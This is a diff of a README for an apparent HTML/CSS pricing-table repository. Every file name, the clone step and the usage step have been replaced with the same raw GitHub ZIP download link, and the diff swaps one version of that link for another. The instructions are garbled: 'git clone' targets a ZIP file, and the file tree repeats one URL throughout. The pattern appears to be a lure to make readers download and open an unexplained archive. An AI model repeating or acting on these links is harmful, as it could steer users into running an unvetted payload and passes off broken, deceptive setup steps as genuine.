@@ -21,25 +21,25 @@ A responsive pricing table designed using HTML and CSS. This project provides a 
 
 1. Clone this repository:
    ```sh
-   git clone https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-2. Open the https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip file in your browser.
+   git clone https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+2. Open the https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip file in your browser.
 
 ## File Structure
 
 pricingTableMaster/
-│── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-│── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
+│── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+│── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
 │── resources/
-│   ├── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-│   ├── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-│   ├── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-│   ├── down https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-│   ├── down https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
-│── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip
+│   ├── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+│   ├── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+│   ├── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+│   ├── down https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+│   ├── down https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
+│── https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip
 
 ## Usage
 
-Simply open `https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Table_Master_pricing_v2.4-beta.3.zip` in a web browser to view the pricing table.
+Simply open `https://raw.githubusercontent.com/ronny-gans/pricingTableMaster/main/resources/Master-Table-pricing-v2.6.zip` in a web browser to view the pricing table.
 
 ## Responsive Design
 
